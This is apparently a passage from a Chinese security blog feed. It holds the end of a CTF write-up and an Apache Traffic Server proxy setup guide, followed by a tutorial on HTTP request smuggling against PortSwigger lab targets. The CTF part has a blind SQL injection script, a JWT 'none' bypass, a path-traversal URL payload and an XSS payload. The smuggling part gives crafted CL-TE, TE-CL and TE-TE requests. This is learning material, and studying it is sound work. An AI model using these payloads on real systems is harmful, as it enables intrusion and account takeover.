class="hljs-number">2</span>);$cipher = <span class="hljs-string">''</span>;<span class="hljs-keyword">foreach</span>($arr <span class="hljs-keyword">as</span> $value) &#123;$num = hexdec($value);$num = $num + <span class="hljs-number">240</span>;$cipher = $cipher.<span class="hljs-string">'&amp;'</span>.dechex($num);&#125;<span class="hljs-keyword">return</span> $cipher;&#125;<span class="hljs-keyword">echo</span> cookie_encode(serialize($a));<span class="hljs-keyword">echo</span> <span class="hljs-string">"\r\n"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cookie_decode</span><span class="hljs-params">($str)</span> </span>&#123;$data = urldecode($str);$data = substr($data, <span class="hljs-number">1</span>);$arr = explode(<span class="hljs-string">'&amp;'</span>, $data);$cipher = <span class="hljs-string">''</span>;<span class="hljs-keyword">foreach</span>($arr <span class="hljs-keyword">as</span> $value) &#123;$num = hexdec($value);$num = $num - <span class="hljs-number">240</span>;$cipher = $cipher.<span class="hljs-string">'%'</span>.dechex($num);&#125;$key = urldecode($cipher);$key = base64_decode($key);<span class="hljs-keyword">return</span> $key;&#125;$cookie = <span class="hljs-string">"%26144%2616a%2615f%26123%2613f%26159%2613a%2616a%2614a%26148%2613e%2616a%26151%26147%26129%26165%26139%2615a%2615f%2616a%2613f%2615e%26164%2616a%2613f%2615a%26149%26126%26139%2615d%2613e%2615f%26152%26122%26129%2616a%2614a%26143%26139%26127%26151%26144%2615f%26168%2613f%26123%2613d%26126%2613d%2615a%2615f%26159%26151%26147%26141%26159%2613f%26122%2615b%26126%2613d%26144%26164%2616a%2613f%2615a%26157%26126%26139%2615e%26146%2616a%2614a%26148%2613a%26165%26149%26147%26121%2615c%26139%2615a%26164%2616a%2613f%2615a%26153%26126%26139%2615e%26146%26165%26149%26147%26142%26164%26151%26147%26124%26159%2613f%26123%26120%2612d"</span>;<span class="hljs-keyword">echo</span> cookie_decode($cookie);</code></pre><p><img src="./1572152358591.png" srcset="/img/loading.gif" alt="1572152358591"></p><h1 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h1><ol><li><p>重置密码处盲注: ‘ || ascii(substr(password),{i},1))={j}#,得到密码一半的flag，利用密码登录</p><p><code>flag{never_too</code></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl=<span class="hljs-string">"http://101.71.29.5:10045/index.php?file=forget"</span>str1 = string.printableresult=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:        data =&#123;            <span class="hljs-string">'username'</span>:<span class="hljs-string">f"' || ascii(substr(password,<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;ord(j)&#125;</span>#"</span>        &#125;        rep = requests.post(url,data=data)        print(data)        <span class="hljs-keyword">if</span> <span class="hljs-string">"ok"</span> <span class="hljs-keyword">in</span> rep.text:            result+=j            print(result)            <span class="hljs-keyword">break</span></code></pre></li></ol><ol start="2"><li>在修改referer头为127.0.0.1 得到另一半flag</li></ol><p>flag: never_too_late_to_x</p><h1 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h1><ol><li>先给osword发送重置密码邮件，</li><li>使用收到的验证码，进入到重置密码界面</li><li>再发送给admin重置密码，session更改username为admin</li><li>接着修改密码zxasqw159</li><li>登录admin zxasqw159即可得到flag</li></ol><p><img src="./1572000991468.png" srcset="/img/loading.gif" alt="1572000991468"></p><h1 id="加密的备忘录"><a href="#加密的备忘录" class="headerlink" title="加密的备忘录"></a>加密的备忘录</h1><p>比简单备忘录多加了个<code>unicode</code>混淆</p><p><strong>/graphql</strong>提供了graphql查询，查下结构，</p><pre><code class="hljs clojure">&#123;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;</code></pre><p>Query类多出checkPass方法，查询Memo_接口password</p><pre><code class="hljs taggerscript"><span class="hljs-symbol">\u</span>8981<span class="hljs-symbol">\u</span>6709<span class="hljs-symbol">\u</span>4e86<span class="hljs-symbol">\u</span>4ea7<span class="hljs-symbol">\u</span>4e8e<span class="hljs-symbol">\u</span>4e86<span class="hljs-symbol">\u</span>4e3b<span class="hljs-symbol">\u</span>65b9<span class="hljs-symbol">\u</span>4ee5<span class="hljs-symbol">\u</span>5b9a<span class="hljs-symbol">\u</span>4eba<span class="hljs-symbol">\u</span>65b9<span class="hljs-symbol">\u</span>4e8e<span class="hljs-symbol">\u</span>6709<span class="hljs-symbol">\u</span>6210<span class="hljs-symbol">\u</span>4ee5<span class="hljs-symbol">\u</span>4ed6<span class="hljs-symbol">\u</span>7684<span class="hljs-symbol">\u</span>7231<span class="hljs-symbol">\u</span>7231要有了产于了主方以定人方于有成以他的爱爱</code></pre><p>用checkPass，输入password:1 回显</p><pre><code class="hljs taggerscript">"<span class="hljs-symbol">\u</span>4e3a<span class="hljs-symbol">\u</span>6211<span class="hljs-symbol">\u</span>7231<span class="hljs-symbol">\u</span>7231" not valid password为我爱爱</code></pre><p>思路：输入字符与原密文比较得到明文</p><ol><li>爆破第一位，checkPass函数传入的参数password：[0-9a-zA-Z]，观察结果中带有密文password的第一个unicode编码：<strong>\u8981</strong>，发现[H-K]都满足</li><li>第一位设置区间为[H-K]，第二位设置区间[0-9a-zA-Z]，只要得到unicode编码为：<strong>\u8981\u6709</strong>，即为对应的明文。发现当第一位为<strong>H</strong>，第二位为<strong>[a-o]</strong>时，都可以得到<code>\u8981\u6709。</code>确定第一位明文为<strong>H</strong>，接着在对第二位进行爆破</li><li>第二位设置区间[a-o]，第三位设置区间[0-9a-zA-Z]</li></ol><p>不会写脚本直接手lu,得到password：<strong>HappY4Gr4phQL</strong></p><h1 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h1><p>登录注册界面</p><p><img src="./1573556772013.png" srcset="/img/loading.gif" alt="1573556772013"></p><p>登录之后，服务端本地开启9000端口读取本地文件，路径依据注册的账号，可以便利目录读文件</p><p><img src="./1573556758357.png" srcset="/img/loading.gif" alt="1573556758357"></p><p>Express框架，读取<strong><a href="http://127.0.0.1:9000/upload/../package.json?.jpg" target="_blank" rel="noopener">http://127.0.0.1:9000/upload/../package.json?.jpg</a></strong></p><p><img src="./1573556592148.png" srcset="/img/loading.gif" alt="1573556592148"></p><p>后端使用jwt构造身份验证</p><p><img src="./1573565534827.png" srcset="/img/loading.gif" alt="1573565534827"></p><ol><li>利用express当传入algorithm为none，会使用algorithm none解密</li><li><code>var secret = global.secretlist[id];</code> 传入不存在的id，使得secret为undefined</li></ol><p><img src="./1573565835641.png" srcset="/img/loading.gif" alt="1573565835641"></p><p>在login界面增加伪造token，并登录,进入admin后台，session.name=’admin’，就能够访问admin23333_interface.js</p><p><img src="./1573566009065.png" srcset="/img/loading.gif" alt="1573566009065"></p><p><img src="./1573565975973.png" srcset="/img/loading.gif" alt="1573565975973"></p><p>admin23333_interface.js有个文件读取接口,参数可控</p><p><img src="./1573566045820.png" srcset="/img/loading.gif" alt="1573566045820"></p><p>用到两个trick:</p><ol><li>传入a[b]=1 会转为a={“b”:1}构造为对象，正则匹配无法识别对象，爆warnnig绕过第一个if</li><li>length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express  中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成</li></ol><p><img src="./1573562632890.png" srcset="/img/loading.gif" alt="1573562632890"></p><p>payload:<code>&lt;http://183.129.189.60:10047/admin23333_interface?name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g&gt;</code></p><p><img src="./1573566304858.png" srcset="/img/loading.gif" alt="1573566304858"></p><pre><code class="hljs js">&lt;img src=<span class="hljs-string">'123'</span> onerror=<span class="hljs-string">'alert(1)'</span> &gt;</code></pre><p><img src="./1573567727736.png" srcset="/img/loading.gif" alt="1573567727736"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ATS反向代理环境搭建</title>
    <link href="/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="apache2环境搭建"><a href="#apache2环境搭建" class="headerlink" title="apache2环境搭建"></a>apache2环境搭建</h1><p>安装</p><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> apache2</code></pre><p>端口配置，防止安装nginx端口冲突</p><pre><code class="hljs angelscript">ports.conf:<span class="hljs-number">5</span>:Listen <span class="hljs-number">8083</span>sites-available/<span class="hljs-number">000</span>-<span class="hljs-keyword">default</span>.conf:<span class="hljs-number">1</span>:&lt;VirtualHost *:<span class="hljs-number">8083</span>&gt;</code></pre><h1 id="nginx环境安装"><a href="#nginx环境安装" class="headerlink" title="nginx环境安装"></a>nginx环境安装</h1><p>安装</p><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> nginx</code></pre><p>端口配置</p><pre><code class="hljs angelscript">listen <span class="hljs-number">8094</span> default_server;listen [::]:<span class="hljs-number">8094</span> default_server;</code></pre><p>php文件解析配置</p><pre><code class="hljs nginx"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<span class="hljs-attribute">include</span> fastcgi_params;<span class="hljs-comment"># With php7.0-cgi alone:</span><span class="hljs-comment">#fastcgi_pass 127.0.0.1:9000;</span><span class="hljs-comment"># With php7.0-fpm:</span><span class="hljs-attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;<span class="hljs-comment">#fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span>&#125;</code></pre><p>默认index文件配置，添加indexnginx.php</p><pre><code class="hljs n1ql"># Add <span class="hljs-keyword">index</span>.php <span class="hljs-keyword">to</span> the list <span class="hljs-keyword">if</span> you are <span class="hljs-keyword">using</span> PHP<span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm <span class="hljs-keyword">index</span>.nginx-debian.html indexnginx.php;</code></pre><h1 id="本地HOST配置"><a href="#本地HOST配置" class="headerlink" title="本地HOST配置"></a>本地HOST配置</h1><pre><code class="hljs css">172<span class="hljs-selector-class">.31</span><span class="hljs-selector-class">.19</span><span class="hljs-selector-class">.188</span><span class="hljs-selector-pseudo">:8083</span>      <span class="hljs-selector-tag">ats</span><span class="hljs-selector-class">.mengsec</span><span class="hljs-selector-class">.com</span>172<span class="hljs-selector-class">.31</span><span class="hljs-selector-class">.19</span><span class="hljs-selector-class">.188</span><span class="hljs-selector-pseudo">:8094</span>      <span class="hljs-selector-tag">lnmp</span><span class="hljs-selector-class">.mengsec</span><span class="hljs-selector-class">.com</span></code></pre><h1 id="ATS编译安装"><a href="#ATS编译安装" class="headerlink" title="ATS编译安装"></a>ATS编译安装</h1><p>下载</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>trafficserver<span class="hljs-regexp">/archive/</span><span class="hljs-number">7.1</span>.<span class="hljs-number">2</span>.tar.gz</code></pre><p>安装依赖&amp;常用工具</p><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install -y autoconf automake libtool pkg-config libmodule-install-perl gcc libssl-<span class="hljs-built_in">dev</span> libpcre3-<span class="hljs-built_in">dev</span> libcap-<span class="hljs-built_in">dev</span> libhwloc-<span class="hljs-built_in">dev</span> libncurses5-<span class="hljs-built_in">dev</span> libcurl4-openssl-<span class="hljs-built_in">dev</span> flex tcl-<span class="hljs-built_in">dev</span> net-tools vim curl wget</code></pre><p>解压源码，编译安装</p><pre><code class="hljs vim">autoreconf -<span class="hljs-keyword">if</span>./configure --prefix=/<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">ts</span>-<span class="hljs-number">712</span><span class="hljs-keyword">make</span><span class="hljs-keyword">make</span> install</code></pre><p>如果需要关闭缓存功能</p><pre><code class="hljs routeros">vim /opt/ts-712/etc/trafficserver/records.configCONFIG proxy.config.http.cache.http INT 0 # 关闭缓存CONFIG proxy.config.reverse_proxy.enabled INT 1 # 启用反向代理CONFIG proxy.config.url_remap.remap_required INT 1 # 限制ats仅能访问map表中映射的地址CONFIG proxy.config.http.server_ports STRING 80 80:ipv6 # 监听在本地80端口</code></pre><p>编辑<code>remap.config</code>配置文件，在末尾添加要映射的规则表。</p><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">ts</span>-<span class="hljs-number">712</span>/etc/trafficserver/remap.config<span class="hljs-keyword">map</span> http://lnmp.mengsec.<span class="hljs-keyword">com</span>/ http://<span class="hljs-number">172.31</span>.<span class="hljs-number">19.188</span>:<span class="hljs-number">8094</span>/<span class="hljs-keyword">map</span> http://ats.mengsec.<span class="hljs-keyword">com</span>/ http://<span class="hljs-number">172.31</span>.<span class="hljs-number">19.188</span>:<span class="hljs-number">8083</span>/</code></pre><p>开启服务器</p><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>osword<span class="hljs-regexp">/ts-712/</span>binsudo .<span class="hljs-regexp">/trafficserver start</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求走私基础学习(一)</title>
    <link href="/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
    <url>/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTPS请求走私"><a href="#HTTPS请求走私" class="headerlink" title="HTTPS请求走私"></a>HTTPS请求走私</h1><p>该漏洞产生原因主要是前后端服务器对请求处理RFC标准不同。造成后端恶意代码缓存驻留</p><p><img src="./smuggling-http-request-to-back-end-server.svg" srcset="/img/loading.gif" alt="smuggling-http-request-to-back-end-server"></p><h1 id="几个重要概念"><a href="#几个重要概念" class="headerlink" title="几个重要概念"></a>几个重要概念</h1><h3 id="TCP复用"><a href="#TCP复用" class="headerlink" title="TCP复用"></a>TCP复用</h3><p>为了节省代理服务器与后端服务器同效率，往往会复用同一个tcp连接</p><p>参考链接：<a href="https://www.lushevol.com/2018/08/21/TCP%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/" target="_blank" rel="noopener">https://www.lushevol.com/2018/08/21/TCP%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/</a></p><p><img src="./1571288904672.png" srcset="/img/loading.gif" alt="1571288904672"></p><h2 id="http1-1协议连接保持"><a href="#http1-1协议连接保持" class="headerlink" title="http1.1协议连接保持"></a>http1.1协议连接保持</h2><ul><li><strong>Keep Alive</strong> mode</li><li><strong>Pipelined</strong> queries</li></ul><h3 id="pipelining"><a href="#pipelining" class="headerlink" title="pipelining"></a>pipelining</h3><pre><code class="hljs coq">[Client]                  [<span class="hljs-keyword">End</span> Server]       |                         <span class="hljs-type">|</span><span class="hljs-type">       &gt;-requ</span>. Suzann ----------&gt;|<span class="hljs-type"></span><span class="hljs-type">       &gt;-requ</span>. Ivan ------------&gt;|<span class="hljs-type"></span><span class="hljs-type">       &gt;-requ</span>. Walter-----------&gt;|<span class="hljs-type"></span><span class="hljs-type">       |&lt;---------- resp</span>. Suzann-&lt;       |<span class="hljs-type">&lt;------------ resp</span>. Ivan-&lt;       |<span class="hljs-type">&lt;---------- resp</span>. Walter-&lt;</code></pre><h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep Alive"></a>Keep Alive</h3><pre><code class="hljs elm">[<span class="hljs-type">Client</span>]                  [<span class="hljs-type">End</span> <span class="hljs-type">Server</span>]    |                         |    &gt;-requ. <span class="hljs-type">Suzann</span> <span class="hljs-comment">----------&gt;|</span>    |&lt;-<span class="hljs-comment">--------- resp. Suzann-&lt;</span>    &gt;-requ. <span class="hljs-type">Ivan</span> <span class="hljs-comment">------------&gt;|</span>    |&lt;-<span class="hljs-comment">----------- resp. Ivan-&lt;</span>    &gt;-req. <span class="hljs-type">Walter</span><span class="hljs-comment">------------&gt;|</span>    |&lt;-<span class="hljs-comment">--------- resp. Walter-&lt;</span></code></pre><h1 id="HTTP-中间代理服务器和后端服务器通信示意图"><a href="#HTTP-中间代理服务器和后端服务器通信示意图" class="headerlink" title="HTTP 中间代理服务器和后端服务器通信示意图"></a>HTTP 中间代理服务器和后端服务器通信示意图</h1><pre><code class="hljs gherkin">[Client]             [Middleware]          [End Server]       |<span class="hljs-string">                     </span>|<span class="hljs-string">                     </span>|       &gt;-requ. Suzann ------&gt;|<span class="hljs-string">                     </span>|       &gt;-requ. Ivan --------&gt;|<span class="hljs-string">                     </span>|       &gt;-req. Walter -------&gt;|<span class="hljs-string">                     </span>|       |<span class="hljs-string">                     &gt;-requ. Suzann ------&gt;</span>|       |<span class="hljs-string">                     </span>|<span class="hljs-string">&lt;------ resp. Suzann-&lt;</span><span class="hljs-string">       </span>|<span class="hljs-string">&lt;------ resp. Suzann-&lt;                     </span>|       |<span class="hljs-string">                     &gt;-requ. Ivan --------&gt;</span>|       |<span class="hljs-string">                     </span>|<span class="hljs-string">&lt;-------- resp. Ivan-&lt;</span><span class="hljs-string">       </span>|<span class="hljs-string">&lt;-------- resp. Ivan-&lt;                     </span>|       |<span class="hljs-string">                     &gt;-req. Walter--------&gt;</span>|       |<span class="hljs-string">                     </span>|<span class="hljs-string">&lt;------- resp Walter-&lt;</span><span class="hljs-string">       </span>|<span class="hljs-string">&lt;------ resp. Walter-&lt;                     </span>|</code></pre><h1 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h1><blockquote><ol><li><p>前端代理服务器允许GET请求携带请求体</p></li><li><p>后端服务器不允许GET请求携带请求体</p></li></ol><p>：后端忽略GET请求中的Content-Length头，可以注入新的GET请求，由于Pipeline存在，后端判定收到两个请求</p></blockquote><p>如传入：</p><pre><code class="hljs http">GET / HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n<span class="hljs-attribute">Content-Length</span>: 44\r\nGET / secret HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n\r\n</code></pre><p>前端<strong>允许</strong>GET携带请求体，所以将上述包传到后端，后端<strong>不允许</strong>GET请求携带请求体，认定为两个请求</p><pre><code class="hljs http">第一个GET / HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n第二个GET / secret HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n</code></pre><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>CL不为0的GET请求导致走私，<strong>主要是前后端服务器对Content-Length即请求体是否执行一致。</strong></p><h1 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h1><blockquote><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p><p>RFC7230表明当一个http请求带有多个不同Content-length会导致400错误</p></blockquote><p><img src="./1571278218243.png" srcset="/img/loading.gif" alt="1571278218243"></p><h2 id="不规范操作"><a href="#不规范操作" class="headerlink" title="不规范操作"></a>不规范操作</h2><blockquote><p>前端代理服务器和后端服务器接收多个Content-Length不会返回400错误。</p><p>​    代理服务器使用第一个Content-Length处理数据</p><p>​    后端代理服务器使用第二个Content-Length处理数据</p></blockquote><p>恶意包构建</p><pre><code class="hljs php">POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: example.com\r\nContent-Length: <span class="hljs-number">8</span>\r\nContent-Length: <span class="hljs-number">7</span>\r\n<span class="hljs-number">12345</span>\r\na</code></pre><p>中间代理服务器处理请求体长度为8，处理到5。但后端服务器处理请求体长度为7,剩下的字符5会放入缓冲区。如果这时候在接收到一个如下get请求会携带a字符一起处理。</p><pre><code class="hljs http">GET /index.html HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n</code></pre><p>实际处理结果,返回<code>aGET request method not found</code>，实现走私攻击。</p><pre><code class="hljs http">aGET /index.html HTTP/1.1\r\n<span class="hljs-attribute">Host</span>: example.com\r\n</code></pre><blockquote><p><code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code></p></blockquote><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><blockquote><p>CL-TE: 接收两个请求头，前端代理服务器只处理Content-Length，后端遵守RFC2616忽略Content-Length，处理Transfer-Encoding</p></blockquote><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>同时放入<strong>Content-Length和Transfer-Encoding</strong>头，访问正常</p><p><img src="./1571287661298.png" srcset="/img/loading.gif" alt="1571287661298"></p><p>只放入<strong>Conetent-Length</strong>，连接挂起，因为服务端需要接收99个字节的请求体，可以证明服务区在对同时处理<strong>Content-Length与Transfer-Encoding会将Content-Length去除</strong></p><p><img src="./1571287726810.png" srcset="/img/loading.gif" alt="1571287726810"></p><h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>伪造http包</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: ac5c1f3f1ee1d59780728119006600b8.web-security-academy.net<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: https://portswigger.net/users?returnurl=%2facademy%2flabs%2flaunch%2febc97abbe886e96facc0aaee856f55e2a45d4784f5d9025ffa5e994b7d8bc2bb%3freferrer%3d%252fweb-security%252frequest-smuggling%252flab-basic-cl-te<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: keep-alive<span class="hljs-attribute">Cookie</span>: session=JWPczeHT40XYRaExizH7ScudZ6hnlfX6<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 11<span class="hljs-attribute">Transfer-Encoding</span>: chunked\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span><span class="hljs-attribute">123456</span></code></pre><p>关闭burpsuite自动更新Content-Length，多次发送以下包造成走私攻击</p><p><img src="./1571288321363.png" srcset="/img/loading.gif" alt="1571288321363"></p><p>前端代理服务器就收到Content-Length长度为11，之后将以下请求体发送到后端服务器</p><pre><code class="hljs http"><span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span><span class="hljs-attribute">123456</span></code></pre><p>后端遵守RFC规则,抹除了<strong>Content-Length请求头</strong>，只处理<strong>Transfer-Encoding</strong>。一下是chunk传输格式，后端遇到连续的<code>0\r\n\r\n</code>会认为传输结束，这时’123456’就会被留在缓冲区会与下个http请求拼接。得到’123456POST’</p><p>chunk传输格式</p><pre><code class="hljs http">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</code></pre><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>TE-CL就是当存在两个请求头，前端代理服务器处理<strong>Transfer-Encoding</strong>，后端服务器处理<strong>Content-Length请求头</strong></p><h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>构造请求包</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: ac7f1fe61e17d5978046843b0047009f.web-security-academy.net<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: session=NBbX2y8mopewc0yIgkbqdn9BmgA8PKpt<span class="hljs-attribute">Content-Length</span>: 4<span class="hljs-attribute">Transfer-Encoding</span>: chunked\r\n<span class="hljs-attribute">12\r\n</span>GPOST / HTTP/1.1\r\n\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span></code></pre><p>前端代理服务器响应Transfer-Encoding，处理以下数据。Transfer-Encoding遇到<code>0\r\n\r\n</code>数据接收停止</p><pre><code class="hljs http">\r\n<span class="hljs-attribute">12\r\n</span>GPOST / HTTP/1.1\r\n\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span></code></pre><p>后端服务器响应Content-Length，处理以下数据，接收4字节数据</p><pre><code class="hljs http"><span class="hljs-attribute">12\r\n</span></code></pre><p><img src="./1571292321058.png" srcset="/img/loading.gif" alt="1571292321058"></p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p> 前后端都处理<code>Transfer-Encoding</code>请求头，要点是前端接收可以处理的Transfer-Encoding头，后端接收无法识别的Transfer-Encoding头。类似<code>CL-TE</code>或者<code>TE-CL</code>，不同的是，如果不传入<code>Transfer-Encoding: xxx</code>后端扔会前后端扔会正常处理”Content-Length、Transfer-Encoding”，在CL-TE、TE-CL不行的情况下，可以考虑使用。</p><h2 id="靶机-1"><a href="#靶机-1" class="headerlink" title="靶机"></a>靶机</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: acd11f061e2b224780f80459004500f2.web-security-academy.net<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Cookie</span>: session=iLGLf03I7Lu3VUWRK8KVmwoarv2Btbhu<span class="hljs-attribute">Content-Length</span>: 4<span class="hljs-attribute">Transfer-Encoding</span>: chunked<span class="hljs-attribute">Transfer-Encoding</span>: xxx\r\n<span class="hljs-attribute">5c\r\n</span>GPOST / HTTP/1.1\r\n<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n<span class="hljs-attribute">Content-Length</span>: 15\r\n\r\nx=1\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span></code></pre><p><img src="./1571293596089.png" srcset="/img/loading.gif" alt="1571293596089"></p><p>根据顺序，前端代理服务器处理<code>Transfer-Encoding: chuncked</code></p><pre><code class="hljs http">\r\n<span class="hljs-attribute">5c\r\n</span>GPOST / HTTP/1.1\r\n<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n<span class="hljs-attribute">Content-Length</span>: 15\r\n\r\nx=1\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span></code></pre><p>而后端处理<code>Transfer-Encoding: xxx</code> 无法识别，再识别<code>Content-Lengt: 4</code>处理四字节数据</p><pre><code class="hljs http">\r\n<span class="hljs-attribute">5c\r\n</span></code></pre><p>所以就造成一下数据存入缓存中</p><pre><code class="hljs http">GPOST / HTTP/1.1\r\n<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n<span class="hljs-attribute">Content-Length</span>: 15\r\n\r\nx=1\r\n<span class="hljs-attribute">0\r\n</span><span class="hljs-attribute">\r\n</span></code></pre><h1 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h1><ol><li>注意CLRF符号，如果<strong>Transfer-Encoding</strong>再遇到<code>\r\n</code>会认为还会有数据，<strong>(CL-TE)</strong></li><li>TE-TE在CL-TE或者TE-CL不奏效时候可以尝试使用。</li><li>不论是哪种方式的走私攻击，都是前后端服务器对RFC标准实现的不统一。</li></ol><blockquote><p>CL不为0：利用前端允许GET带请求体，后端不允许，由于pipelining缘故，造成后端将请求体请求当做另一个请求</p><p>CL-CL: 